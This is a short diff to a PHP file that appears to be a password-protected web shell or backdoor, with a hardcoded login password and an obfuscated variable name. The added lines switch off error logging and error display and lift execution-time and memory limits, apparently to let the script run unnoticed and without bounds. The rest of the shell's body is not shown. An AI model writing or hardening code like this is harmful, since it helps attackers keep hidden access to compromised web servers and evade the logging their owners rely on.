@@ -1,5 +1,21 @@
 <?php
+@set_time_limit(0);
+@clearstatcache();
 error_reporting(0);
+@ini_set('error_log',null);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('display_errors', 0);
+@ini_set('display_startup_errors', '0');
+@ini_set('memory_limit', '-1');
+@ini_set('output_buffering', '0');
+@ini_set('implicit_flush', '1');
+ob_implicit_flush(true);
+header('Content-Type: text/html; charset=utf-8');
+header('X-Requested-With: XMLHttpRequest');
+header('Cache-Control: no-cache, no-store, must-revalidate');
+header('Pragma: no-cache');
+header('Expires: 0');
 session_start();
 if (md5($_POST["password"]) == md5('jal888')) {
     $_SESSION["isLogin"] = true;
@@ -426,3 +442,4 @@ if ($jbWgR) {
     }
 }
 echo "</div>\r\n\r\n\t<footer id=\"footer\" style=\"margin-top: 100px;\">\r\n\r\n\t</footer>\r\n\r\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js\"></script>\r\n<script> \r\n\r\nvar footer = document.querySelector(\"footer\");\r\n\r\nfunction stopScrollAtFooter() {\r\n    var footerHeight = footer.clientHeight;\r\n    var contentHeight = document.body.scrollHeight;\r\n    var scrollY = window.scrollY;\r\n\r\n\tif (scrollY + window.innerHeight >= contentHeight - footerHeight) {\r\n\t\t\twindow.scrollTo(0, contentHeight - window.innerHeight);\r\n\t\t}\r\n\t}\r\n\r\n\twindow.addEventListener(\"scroll\", stopScrollAtFooter);\r\n\r\n\r\n\tdocument.addEventListener('DOMContentLoaded', function() {\r\n    var elems = document.querySelectorAll('select');\r\n    var instances = M.FormSelect.init(elems, {});\r\n  });\r\n</script>\r\n</body>\r\n</html>";
+
